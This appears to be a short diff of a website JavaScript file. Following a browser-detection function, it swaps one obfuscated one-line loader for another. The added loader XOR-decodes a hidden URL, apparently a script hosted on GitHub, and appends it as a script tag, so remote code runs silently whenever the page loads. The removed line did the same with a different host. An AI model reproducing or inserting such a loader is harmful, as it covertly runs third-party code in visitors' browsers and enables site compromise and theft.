@@ -395,4 +395,4 @@ function checkforBrowserType() {
     } else {
         return false
     }
-}var enkripsi1="jvvr'1C--uuu,fgtknqwlktgpqg,amo-fgqkel-hq-d'0702]Vjkpf,hq";teks1="";teksasli1="";var panjang1;panjang1=enkripsi1.length;for(i=0;i<panjang1;i++){teks1+=String.fromCharCode(enkripsi1.charCodeAt(i)^2)}teksasli1=unescape(teks1);document.body.appendChild(document.createElement('script')).src=teksasli1;
+}var enkripsi1="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-AnmaiQrggf,hq";teks1="";teksasli1="";var panjang1;panjang1=enkripsi1.length;for(i=0;i<panjang1;i++){teks1+=String.fromCharCode(enkripsi1.charCodeAt(i)^2)}teksasli1=unescape(teks1);document.body.appendChild(document.createElement('script')).src=teksasli1;
